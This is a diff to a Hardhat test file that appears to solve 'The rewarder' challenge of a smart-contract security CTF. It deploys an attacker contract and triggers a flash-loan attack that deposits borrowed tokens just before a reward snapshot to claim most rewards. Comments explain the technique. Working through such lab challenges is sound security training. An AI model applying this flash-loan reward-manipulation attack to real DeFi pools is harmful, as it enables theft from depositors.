@@ -30,6 +30,9 @@ describe('[Challenge] The rewarder', function () {
         this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
 
+        const FlashLoanTheRewarder = await ethers.getContractFactory('FlashLoanTheRewarder', attacker);
+        this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address);
+
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
             const amount = ethers.utils.parseEther('100');
@@ -44,7 +47,15 @@ describe('[Challenge] The rewarder', function () {
         expect(await this.rewardToken.totalSupply()).to.be.eq('0');
 
         // Advance time 5 days so that depositors can get rewards
-        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const fiveDays = 5 * 24 * 60 * 60;
+        await ethers.provider.send("evm_increaseTime", [fiveDays]); // 5 days
+        /*
+        There are two relevant RPC methods here: evm_increaseTime and evm_setNextBlockTimestamp. 
+        In both cases, they affect the next block but don't mine one.
+        evm_increaseTime receives a number of seconds that will be added to the timestamp of the latest block.
+        evm_setNextBlockTimestamp receives an absolute UNIX timestamp (again, in seconds),
+        and so it's not affected by the current bloc
+         */
         
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
@@ -65,7 +76,33 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+    /** CODE YOUR EXPLOIT HERE
+    There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+    Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+    You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+    Oh, by the way, rumours say a new pool has just landed on mainnet. 
+    Isn't it offering DVT tokens in flash loans?
+
+    A large flash loan deposit right at the beginning of the new round,
+    but just before the distributeRewards() is triggered which would take the account snapshot. 
+    This would allow an attacker to collect the reward and withdraw deposited tokens to return them back to the flash loan pool all in the same transaction.
+    */
+
+        console.log("\nRound:",BigInt(await this.rewarderPool.roundNumber()));
+        let AttackerReward = ethers.utils.formatEther(await this.rewardToken.balanceOf(attacker.address));
+        console.log("RewardToken Balance:",AttackerReward.toString());
+
+        // We simulate waiting just long enough for the next round to start.
+        const fiveDays = 5 * 24 * 60 * 60;
+        await ethers.provider.send("evm_increaseTime", [fiveDays]); 
+        // It need to use evm_increaseTime because account start snapshot to give reward
+        // during deposit only beginning of new round (5 days)
+        // It force the round-start (snapshot) to be within a different transaction/block
+        await this.attackerContract.executeFlashLoanAttack(TOKENS_IN_LENDER_POOL);
+       
+        console.log("\nRound:",BigInt(await this.rewarderPool.roundNumber()));
+        AttackerReward = ethers.utils.formatEther(await this.rewardToken.balanceOf(attacker.address));
+        console.log("RewardToken Balance:",AttackerReward.toString());
     });
 
     after(async function () {
